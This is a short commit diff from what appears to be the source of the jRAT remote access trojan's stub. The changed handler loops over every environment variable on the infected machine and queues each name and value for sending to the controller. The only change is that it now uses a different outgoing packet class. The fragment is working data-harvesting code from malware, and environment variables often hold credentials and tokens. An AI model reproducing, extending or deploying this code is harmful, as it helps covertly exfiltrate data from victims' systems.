@@ -3,8 +3,7 @@ package se.jrat.stub.packets.incoming;
 import java.util.Set;
 
 import se.jrat.stub.Connection;
-import se.jrat.stub.packets.outgoing.Packet44SystemJavaProperty;
-
+import se.jrat.stub.packets.outgoing.Packet32SystemProperties;
 
 public class Packet96EnvironmentVariables extends AbstractIncomingPacket {
 
@@ -12,7 +11,7 @@ public class Packet96EnvironmentVariables extends AbstractIncomingPacket {
 	public void read() throws Exception {
 		Set<String> set = System.getenv().keySet();
 		for (String str : set) {
-			Connection.instance.addToSendQueue(new Packet44SystemJavaProperty(str, System.getenv().get(str)));
+			Connection.instance.addToSendQueue(new Packet32SystemProperties(str, System.getenv().get(str)));
 		}
 	}
 
